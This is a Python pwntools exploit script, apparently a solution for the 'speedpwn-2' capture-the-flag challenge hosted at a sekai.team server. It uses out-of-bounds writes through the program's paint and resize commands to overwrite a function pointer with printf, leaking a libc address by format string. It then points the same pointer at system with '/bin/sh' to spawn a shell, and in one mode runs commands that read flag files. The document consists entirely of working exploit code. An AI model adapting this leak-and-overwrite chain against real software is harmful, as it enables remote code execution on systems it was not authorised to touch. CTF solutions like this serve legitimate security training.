#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("speedpwn-2.chals.sekai.team", 1337, ssl=True)
    return p

p = conn()

def paint(x, y, char):
    p.sendlineafter(">", f"p {x} {y} {hex(char)[2:]}")

def resize(x, y):
    p.sendlineafter(">", f"r {x} {y}")


paint(0, -0x290, 0x1)
loc = 0x404070
i = 0
while loc > 0:
    paint(0, -0x210 + i, loc & 0xff)
    loc >>= 8
    i += 1

resize(1, 0x10)

printf_plt = 0x401100
for i in range(8):
    paint(0, -0x70 + i, printf_plt & 0xff)
    printf_plt >>= 8

lol = b'%17$lp'
for i,j in enumerate(lol):
    paint(0, i, j) 

resize(20, 20)
leak = int(p.recvuntil('.')[:-1], 16)
libc_base = leak - 0x2a1ca
system = libc_base + 0x58750 
print(hex(leak))


loc = 0x404070
i = 0
paint(0, -0x290, 0x1)
while loc > 0:
    paint(0, -0x210 + i, loc & 0xff)
    loc >>= 8
    i += 1

resize(1, 0x10)

for i in range(8):
    paint(0, -0x70 + i, system & 0xff)
    system >>= 8

lol = b'/bin/sh\0'
for i,j in enumerate(lol):
    paint(0, i, j) 

resize(20, 20)
debug()

if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
